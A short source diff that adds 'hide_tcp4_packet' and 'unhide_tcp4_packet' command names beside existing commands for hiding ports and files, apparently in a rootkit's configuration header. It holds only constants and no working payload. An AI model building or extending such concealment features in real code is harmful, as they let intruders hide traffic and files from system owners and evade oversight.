@@ -29,6 +29,8 @@
 #define CFG_UNHIDE_UDP_PORT "unhide_udp_port"
 #define CFG_HIDE_UDP6_PORT "hide_udp6_port"
 #define CFG_UNHIDE_UDP6_PORT "unhide_udp6_port"
+#define CFG_HIDE_TCP4_PACKET "hide_tcp4_packet"
+#define CFG_UNHIDE_TCP4_PACKET "unhide_tcp4_packet"
 #define CFG_HIDE_FILE "hide_file"
 #define CFG_UNHIDE_FILE "unhide_file"
 #define CFG_HIDE "hide"
